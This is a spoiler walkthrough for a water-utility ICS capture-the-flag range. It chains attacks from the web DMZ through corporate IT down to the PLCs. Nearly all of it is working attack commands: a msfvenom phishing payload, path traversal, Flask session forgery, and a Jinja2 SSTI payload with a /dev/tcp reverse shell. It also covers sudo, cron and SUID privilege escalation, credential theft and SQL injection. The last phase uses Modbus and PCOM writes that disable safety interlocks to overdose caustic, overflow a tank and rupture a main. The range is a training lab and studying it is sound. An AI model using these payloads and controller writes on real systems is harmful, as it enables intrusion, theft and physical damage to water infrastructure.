# WaterWorks Pipeline — Full Walkthrough (SPOILERS)

Complete solution for all 21 flags. Throughout, **`10.X`** is your range network
(`X` = your Ludus range number, the second octet). Every command is the intended
path; creative alternatives are fine. Flags are `WTR{...}`; submit them at the
scoreboard (`http://10.X.60.10`).

Attack flow:

```
 you(VPN) ─▶ ww-web01 ─▶ ww-fs01 ──┐
                        ww-it01 ────┼─▶ ww-jump01 ─▶ ww-hmi01 ─┐
                        ww-hist01   │   ww-eng01 ──────────────┼─▶ ww-plc01 / plc02 / rtu03
                                    └──────────────────────────┘        (IMPACT)
```

> **Pivoting note.** From the VPN you can reach only VLAN 10 (`ww-web01`) and
> VLAN 60 (scoreboard). Everything else is reached by tunnelling through hosts you
> own. Set up a SOCKS proxy / port-forwards as you go — e.g. `ssh -D 1080`,
> `ligolo-ng`, or `chisel`. Each phase below notes where to pivot from.

---

## Phase 0 — Intel flags (from the case study)

Read [CASE_STUDY.md](CASE_STUDY.md) and answer the scoreboard's Intel questions:

| Flag | Question | Answer |
|------|----------|--------|
| `intel_oldsmar` (50) | NaOH setpoint (ppm) the Oldsmar attacker dialed in | `WTR{11100}` |
| `intel_pcom` (50) | TCP port for Unitronics PCOM | `WTR{20256}` |
| `intel_attack` (50) | ATT&CK for ICS technique ID for "Modify Parameter" | `WTR{T0836}` |

---

## Phase 1 — Initial access

There are **two independent ways in**. Do either (or both). Phase 1A is the web
exploit chain on the DMZ; Phase 1B is phishing the HR workstation. Phase 1B lands
you directly inside Corporate IT (VLAN 20), skipping the web→IT pivot.

---

## Phase 1B (alternative) — Phishing the HR workstation → `foothold_phish` (150)

**Target:** `ww-ws01` (Windows HR workstation, 10.X.20.30), via the public
Careers page on `ww-web01`.

WaterWorks is hiring, and the Careers page accepts resume uploads. An HR user
(`a.wallace`) is auto-logged-on to `ww-ws01` and runs an "HR Resume Intake" task
that downloads every uploaded file and **opens it (double-click)**. So a
double-clickable payload becomes code execution on the workstation.

1. **Build a payload** with your own C2 (LHOST = your WireGuard IP, e.g. `198.51.100.x`).
   Any double-clickable format works — `.exe`, `.scr`, `.vbs`, `.bat`, `.cmd`,
   `.hta`, `.lnk`:
   ```bash
   # example: a staged Meterpreter exe (use whatever C2 you like)
   msfvenom -p windows/x64/meterpreter/reverse_https LHOST=198.51.100.X LPORT=443 -f exe -o resume_amanda_wallace.exe
   # start your listener (msfconsole multi/handler, Sliver, Havoc, nc for a plain shell, …)
   ```
2. **Upload it** to the Careers page (unauthenticated), from your VPN host:
   ```bash
   curl -s -F 'name=Amanda W' -F 'email=a@x.com' \
        -F 'resume=@resume_amanda_wallace.exe' \
        http://waterworkspipeline.com/careers/apply
   # confirm it landed in the HR intake queue:
   curl -s http://waterworkspipeline.com/careers/inbox.json
   ```
3. **Wait ~20–40 s.** The HR intake task pulls your file to `a.wallace`'s Downloads,
   strips Mark-of-the-Web, and double-clicks it → your implant fires and beacons
   back over WireGuard.
4. **On your beacon** (running as `a.wallace` on `WW-WS01`), grab the flag and
   start pivoting:
   ```cmd
   type C:\Users\a.wallace\Desktop\flag.txt      REM foothold_phish
   ```
   You're now in VLAN 20. `ww-fs01` and `ww-it01` are on the **same subnet** (no
   firewall between them), so you can hit the file server's SMB shares and the IT
   server directly from here, then continue with Phase 2 onward. Route your tools
   through this beacon (SOCKS via your C2) to reach the rest of the range.

> Tip: `curl -s http://waterworkspipeline.com/careers/inbox.json` lets you confirm
> your upload is queued; the file disappears from "new" once HR has opened it.

---

## Phase 1A — Initial access on the DMZ web server (`ww-web01`, 10.X.10.10)

### 1a. Recon → `web_recon` (50)

```bash
curl -s http://waterworkspipeline.com/robots.txt
#   Disallow: /staging/
#   Disallow: /reports/archive/
curl -s http://waterworkspipeline.com/staging/ | grep -i -A2 WTR
```

The staging page's HTML comment holds **`web_recon`** and a dev note:
*"TODO: report downloader accepts nested paths now; sanitize before go-live (JIRA WEB-88)"* — your next lead.

### 1b. Path traversal → app secret + `web_lfi` (100)

The Water Quality page downloads CCR reports via `/reports/download?file=`. It is
vulnerable to traversal (CWE-22):

```bash
# proof:
curl -s "http://waterworkspipeline.com/reports/download?file=../../../../../../etc/passwd"
# the application .env (one dir up from reports/):
curl -s "http://waterworkspipeline.com/reports/download?file=../.env"
```

`.env` yields `FLASK_SECRET_KEY=wwp-portal-...`, `PORTAL_ADMIN_USER=webadmin`, the
`# audit marker:` line = **`web_lfi`**, and a comment that reports sync nightly
from `\\ww-fs01\Public\CCR` as root.

### 1c. Forge an admin session → admin portal

The contractor portal uses Flask's signed-cookie session. With the leaked
`SECRET_KEY`, forge a cookie with `role=admin`:

```bash
pip install flask-unsign
flask-unsign --sign --secret 'wwp-portal-...' \
  --cookie "{'user': 'webadmin', 'role': 'admin'}"
# send it:
curl -s http://waterworkspipeline.com/portal/admin \
  --cookie "session=<forged-cookie>"
```

### 1d. SSTI in the notice preview → RCE → `web_rce` (150)

`/portal/admin` is the "Public Notice Publisher". The **Preview** action renders
the notice body with `render_template_string` — Jinja2 SSTI:

```bash
# body = {{ cycler.__init__.__globals__.os.popen('id').read() }}
curl -s http://waterworkspipeline.com/portal/admin/preview \
  --cookie "session=<forged-cookie>" \
  --data-urlencode "body={{ cycler.__init__.__globals__.os.popen('cat /home/wwp-web/flag.txt').read() }}"
```

That prints **`web_rce`**. Swap in a reverse shell to get an interactive session
as `wwp-web` (the DMZ box is allowed to call back to you over the VPN):

```
body={{ cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/<YOU>/4444 0>&1"').read() }}
```

### 1e. Privilege escalation → root → `web_root` (150)

```bash
sudo -l
#   (root) NOPASSWD: /usr/bin/rsync     # "CCR report publishing (E. Brooks / IT-0931)"
# GTFOBins rsync -> root:
sudo rsync -e 'sh -c "sh 0<&2 1>&2" --' :: 2>/dev/null   # drops a root shell
# or simply read the flags/loot as root:
sudo rsync --no-h -r /root/ /tmp/r/ ; cat /tmp/r/flag.txt     # web_root
```

### 1f. Loot for lateral movement

As root:

```bash
cat /root/.smbcredentials-ccr
#   username=svc_ccrsync  password=CCRsync#Feb2019  domain=WWP
cat /etc/fstab | grep ccr   # //10.X.20.10/Public/CCR ...
```

You now have a corporate credential and a route to `ww-fs01`.

---

## Phase 2 — Corporate IT (VLAN 20)

> Pivot from `ww-web01` (it can reach `ww-fs01:445`). Tunnel SMB through your
> shell/SOCKS, or operate from the web box directly.

### 2a. File server intel → `fs_engineering` (150)

```bash
smbclient -L //10.X.20.10 -U 'svc_ccrsync%CCRsync#Feb2019'
# Readable: Public, Engineering
smbclient //10.X.20.10/Engineering -U 'svc_ccrsync%CCRsync#Feb2019' \
  -c 'cd Network; get WWP_Network_Overview.txt'
grep -i "Document Control ID" WWP_Network_Overview.txt      # fs_engineering
```

The Engineering share also gives you the OT map: the jump-host path, the HMI/VNC
remote-support SOP, the CISA AA23-335A action tracker (PLC default password
"deferred"), the System Description (controller models, Modbus 502 / PCOM 20256),
and the Hilltop surge-study summary. Read all of it — it's your OT playbook.

### 2b. New-hire password pattern → `ww-it01`

From the **Public** share:

```bash
smbclient //10.X.20.10/Public -U 'svc_ccrsync%CCRsync#Feb2019' \
  -c 'cd IT_Helpdesk; get New_Hire_IT_Checklist.txt; cd ..; get Staff_Directory.csv'
```

The checklist states the new-hire password pattern **`WaterWorks<hire year>!`**
and that forced change is *not* enabled for Linux server accounts (IT-1182). The
staff directory shows **Jordan Alvarez (`j.alvarez`), hired 2026-09-08**. So:
`j.alvarez : WaterWorks2026!`.

### 2c. Land on `ww-it01` → `it_spray` (150)

```bash
ssh j.alvarez@10.X.20.20      # WaterWorks2026!
cat ~/flag.txt                # it_spray
```

### 2d. Local root on `ww-it01` → `it_root` (150)

```bash
cat /etc/cron.d/it-config-backup
#   * * * * * root /opt/it-scripts/nightly_config_backup.sh   # "every minute while we debug - DW"
ls -l /opt/it-scripts/nightly_config_backup.sh                # root:helpdesk 0775 (group-writable, you're in helpdesk)
# append a payload; root runs it within a minute:
printf '\ncp /root/flag.txt /tmp/it_root.txt; chmod 644 /tmp/it_root.txt\n' \
  >> /opt/it-scripts/nightly_config_backup.sh
sleep 65; cat /tmp/it_root.txt                                # it_root
# (or drop a SUID shell / add your key for a root shell)
```

### 2e. Steal the IT manager's key → route into the OT DMZ

As root on `ww-it01` (or by escalating to `d.whitfield`):

```bash
cat /home/d.whitfield/.ssh/id_ed25519        # private key (no passphrase)
cat /home/d.whitfield/.ssh/config            # Host ww-jump01 -> 10.X.30.20, User d.whitfield
cat /home/d.whitfield/Documents/OT_Access_Notes.txt
#   hint: on the jump host, "sudo -u hydra_vendor less /opt/hydra/logs/..." to read vendor logs
#   eng workstation ww-eng01 10.X.40.20 reachable only from the jump host
```

Only `ww-it01` (`.20`) is allowed to SSH to `ww-jump01:22`, so pivot through it.

---

## Phase 3 — OT DMZ (VLAN 30)

### 3a. Historian SQL injection → `hist_sqli` (200) + SCADA token

`ww-hist01:8080` is reachable from VLAN 20 ("trend viewing"). Log in with the
advertised read-only guest, then hit the injectable trend parameter:

```bash
# from a VLAN 20 foothold / SOCKS:
curl -s -c cj.txt -d 'username=guest&password=guest' http://10.X.30.10:8080/login
curl -s -b cj.txt \
  "http://10.X.30.10:8080/trend?tag=' UNION SELECT key, value FROM system_config-- -&hours=1"
```

The results table dumps `system_config`, including **`audit_token`** = `hist_sqli`
and **`scada_api_token`** (the HMI API bearer token). `sqlmap -p tag` works too.
The tag browser also hands you the full field-device register map — valuable OT
recon for Phase 5.

### 3b. SSH to the jump host → pivot to the vendor account → `jump_vendor` (200)

```bash
ssh -i d.whitfield_id_ed25519 d.whitfield@10.X.30.20     # from ww-it01
sudo -l
#   (hydra_vendor) NOPASSWD: /usr/bin/less /opt/hydra/logs/*
sudo -u hydra_vendor /usr/bin/less /opt/hydra/logs/session-2026-10-14.log
#   inside less, break out to a shell as hydra_vendor:
#   type:  !sh        (or  v  then  :!/bin/sh )
id        # uid=hydra_vendor
cat ~/flag.txt                       # jump_vendor
cat ~/notes/site_contacts.txt
#   Operator HMI shared login: controlroom / Cedar2019!   (VNC password Cedar201 - binder)
```

`hydra_vendor` here holds `~/.ssh/id_ed25519` + a `~/.ssh/config` for `ww-eng01` —
your key into the SCADA network.

---

## Phase 4 — SCADA control center (VLAN 40)

> Pivot from `ww-jump01`: it is the only host allowed to reach `ww-hmi01` (web+VNC)
> and `ww-eng01` (SSH).

### 4a. HMI access → `hmi_access` (200)

**Web** (from the jump host / tunnel):

```bash
curl -s -c h.txt -d 'username=controlroom&password=Cedar2019!' http://10.X.40.10/login
curl -s -b h.txt http://10.X.40.10/shift-log | grep -o 'WTR{[^}]*}'   # hmi_access
```

**VNC** (same flag also on the operator desktop): forward and connect —
`ssh -L 5900:10.X.40.10:5900 ...` then `vncviewer localhost:5900`, password
`Cedar201` (classic VNC truncates to 8 chars). `~/Desktop/Shift_Log.txt` has it.

The HMI **Alarms** page is where captured **impact** flags appear live once you
trigger them in Phase 5 — keep it open.

### 4b. Engineering workstation → OT toolkit, project files, root → `eng_root` (250)

```bash
# as hydra_vendor on ww-jump01:
ssh ww-eng01                                   # uses ~/.ssh/config + key
ls /opt/hydra-tools  /home/m.oyelaran/projects
```

Project files reveal everything you need to command Level 1 — including, in
`HILLTOP_RTU03_main.st`:

```
(* Maintenance override key (HR20): 8042 - per Hilltop Surge Study 2019;
   bypasses protective interlocks for valve exercising *)
```

(The key `8042` is also the Hilltop station street number — OSINT from the file
server's System Description.) Read `Hilltop_Surge_Analysis_2019.md` — it's the
attacker's playbook for the main break.

Local root via the SUID PATH-hijack:

```bash
ls -l /usr/local/bin/projbackup          # -rwsr-xr-x root  (calls `tar` by name)
cd /tmp && printf '#!/bin/sh\ncat /root/flag.txt > /tmp/eng_root.txt; chmod 644 /tmp/eng_root.txt\n' > tar
chmod +x tar
PATH=/tmp:$PATH /usr/local/bin/projbackup
cat /tmp/eng_root.txt                     # eng_root
```

---

## Phase 5 — Field controllers & impact (VLAN 50)

> From the SCADA hosts you have direct Modbus/TCP (502) to all three controllers,
> and PCOM/TCP (20256) to the chem-feed PLC. Use the toolkit on `ww-eng01`
> (`/opt/hydra-tools/mbtool.py`, `pcom_client.py`) or your own (`mbpoll`,
> `pymodbus`, nmap `modbus-discover`, Metasploit). Addresses below are **0-based
> protocol addresses** (the HMI/docs show 1-based; subtract 1).

Impact flags are written into controller memory as ASCII **and** shown on the HMI
Alarms page the moment the physical condition is met. Each event latches ~10 min,
then the plant self-repairs so you (or the next team) can retry.

### 5a. OT recon

```bash
# Intake device identity -> plc01_devid (150)
mbtool.py 10.X.50.10 devid --code 1
mbtool.py 10.X.50.10 devid --code 4 --obj 6     # UserApplicationName object
#   -> CEDAR_INTAKE_PS1 WTR{...}                # plc01_devid
mbtool.py 10.X.50.10 srvid                        # FC17 identity

# Chem-feed commissioning note -> plc02_pcom (200)   [PCOM ONLY; not Modbus-mapped]
pcom_client.py 10.X.50.20 id
pcom_client.py 10.X.50.20 rw 3000 24 --text
#   -> HYDRA CTRL 2017-05 WTR{...}              # plc02_pcom
```

### 5b. Intake dry-run → `impact_drypump` (300) — `ww-plc01` 10.X.50.10

Defeat the low-low protection, take a pump to HAND, starve the wet well, and hold
it until the pump cavitates.

```bash
mbtool.py 10.X.50.10 wc 10 0        # LL_PROTECT_EN off (coil 10)
mbtool.py 10.X.50.10 wh 0  1        # P101_MODE -> HAND (HR0=1)
mbtool.py 10.X.50.10 wh 15 0        # GATE_SP -> 0 (choke inflow; HR15)
mbtool.py 10.X.50.10 wc 0  1        # P101_HAND_RUN on (coil 0)
# watch it drop and cavitate:
watch -n1 'mbtool.py 10.X.50.10 ri 0 1; mbtool.py 10.X.50.10 ri 8 1'   # WW_LEVEL, P101_VIBRATION
# after level < 2.0 ft for ~10s: pump destroyed, event latches
mbtool.py 10.X.50.10 rh 9000 24 --text        # impact_drypump
```

### 5c. Caustic overdose → `impact_naoh` (300) — `ww-plc02` 10.X.50.20

The HMI caps the NaOH dose at a sane value; the PLC does not. Disable the high-pH
cutout, then set a dose the operator screen would never allow (the Oldsmar move).

```bash
mbtool.py 10.X.50.20 rh 3 1         # FINISHED_PH (×100) baseline ~800 = pH 8.0
mbtool.py 10.X.50.20 wc 2 0         # PH_HIHI_CUTOUT_EN off (coil 2 / MB2)
mbtool.py 10.X.50.20 wh 1 11100     # NAOH_DOSE_SP -> 11100 ppm (HR1 / MI1)
watch -n1 'mbtool.py 10.X.50.20 rh 3 1'       # pH climbs past 11.00
mbtool.py 10.X.50.20 rh 930 24 --text         # impact_naoh
```

(You can do the same over PCOM: `pcom_client.py 10.X.50.20 sb 2 0` then
`pcom_client.py 10.X.50.20 sw 1 11100`.)

### 5d. Panel defacement → `impact_deface` (250) — `ww-plc02`

Overwrite the operator-panel message (MI 900-923, 2 ASCII chars per register):

```bash
python3 - <<'PY'
import sys; sys.path.insert(0,'/opt/hydra-tools')
from mbclient import ModbusClient, text_to_regs
with ModbusClient("10.X.50.20") as c:
    c.write_registers(900, text_to_regs("YOU HAVE BEEN HACKED - WWP", 24))
PY
mbtool.py 10.X.50.20 rh 960 24 --text         # impact_deface
```

### 5e. Summit Tank overflow → `impact_overflow` (300) — `ww-rtu03` 10.X.50.30

The RTU restores its protective settings every scan — unless you enter
maintenance mode first (HR20 = the key `8042`). Then defeat the high-level cutoff
and force the pumps on.

```bash
mbtool.py 10.X.50.30 wh 20 8042     # MAINT_KEY -> maintenance mode (900s)
mbtool.py 10.X.50.30 wc 11 0        # HL_CUTOFF_EN off (coil 11)
mbtool.py 10.X.50.30 wh 0 1         # P301_MODE -> HAND
mbtool.py 10.X.50.30 wc 0 1         # P301_HAND_RUN on
mbtool.py 10.X.50.30 wh 1 1         # P302_MODE -> HAND
mbtool.py 10.X.50.30 wc 1 1         # P302_HAND_RUN on
watch -n2 'mbtool.py 10.X.50.30 ri 4 1'       # TANK_LEVEL (×100) climbs to 3800 = 38 ft
# re-send HR20 if the 900s maintenance window lapses
mbtool.py 10.X.50.30 rh 9000 24 --text        # impact_overflow
```

### 5f. Transmission-main break → `impact_mainbreak` (500) — `ww-rtu03`

The hardest objective. Water hammer. You must defeat **three** independent
protections and induce a transient ≥ 240 psi to rupture the 1962 Miller Creek
crossing. Per the surge study: prime the main with pumps running and the valve
open, then slam FCV-301 shut faster than the engineered slew.

```bash
mbtool.py 10.X.50.30 wh 20 8042     # maintenance mode (lets you change protected regs)
mbtool.py 10.X.50.30 wc 10 0        # HP_TRIP_EN off           (coil 10)
mbtool.py 10.X.50.30 wc 12 0        # SAV_ARMED off (disarm surge valve, coil 12)
mbtool.py 10.X.50.30 wh 3 500       # FCV301_SLEW -> 50.0 %/s  (HR3; removes the rate limit)
mbtool.py 10.X.50.30 wh 2 1000      # FCV301_SP -> 100% (open)
mbtool.py 10.X.50.30 wh 0 1; mbtool.py 10.X.50.30 wc 0 1    # P301 HAND run
mbtool.py 10.X.50.30 wh 1 1; mbtool.py 10.X.50.30 wc 1 1    # P302 HAND run
sleep 6                             # let flow develop
mbtool.py 10.X.50.30 wh 20 8042     # keep maintenance mode alive
mbtool.py 10.X.50.30 wh 2 0         # SLAM the valve shut -> water hammer
watch -n1 'mbtool.py 10.X.50.30 ri 6 1'       # PEAK_TRANSIENT_60S (×10 psi) spikes >2400
mbtool.py 10.X.50.30 rh 9032 24 --text        # impact_mainbreak
```

Bonus: `pcom_client.py 10.X.50.20 stop` places the chemical-feed PLC in STOP
(ICS **T0816 Device Restart/Shutdown**) — outputs de-energize and the process
freezes until `run` (or the auto-repair timer).

---

## Flag checklist (22 — 4,200 pts)

| # | Flag | Pts | Where |
|---|------|-----|-------|
| 0 | foothold_phish | 150 | ww-ws01 `a.wallace` Desktop (phished resume beacon) |
| 1 | web_recon | 50 | ww-web01 `/staging/` comment |
| 2 | web_lfi | 100 | ww-web01 `.env` via traversal |
| 3 | web_rce | 150 | ww-web01 SSTI → `/home/wwp-web/flag.txt` |
| 4 | web_root | 150 | ww-web01 `sudo rsync` → `/root/flag.txt` |
| 5 | fs_engineering | 150 | ww-fs01 Engineering share doc control ID |
| 6 | it_spray | 150 | ww-it01 `j.alvarez` home |
| 7 | it_root | 150 | ww-it01 writable root cron |
| 8 | hist_sqli | 200 | ww-hist01 SQLi `system_config.audit_token` |
| 9 | jump_vendor | 200 | ww-jump01 `less` escape → hydra_vendor home |
| 10 | hmi_access | 200 | ww-hmi01 Shift Log (web/VNC) |
| 11 | eng_root | 250 | ww-eng01 SUID `projbackup` PATH hijack |
| 12 | plc01_devid | 150 | ww-plc01 Modbus FC43 object 0x06 |
| 13 | plc02_pcom | 200 | ww-plc02 PCOM MI 3000-3023 |
| 14 | impact_drypump | 300 | ww-plc01 pump dry-run |
| 15 | impact_naoh | 300 | ww-plc02 caustic overdose |
| 16 | impact_deface | 250 | ww-plc02 panel message overwrite |
| 17 | impact_overflow | 300 | ww-rtu03 tank overflow |
| 18 | impact_mainbreak | 500 | ww-rtu03 water-hammer main break |
| 19 | intel_oldsmar | 50 | case study |
| 20 | intel_pcom | 50 | case study |
| 21 | intel_attack | 50 | case study |

See [REDTEAM_DEBRIEF.md](REDTEAM_DEBRIEF.md) for the ATT&CK mapping and the
defensive findings this engagement would produce.
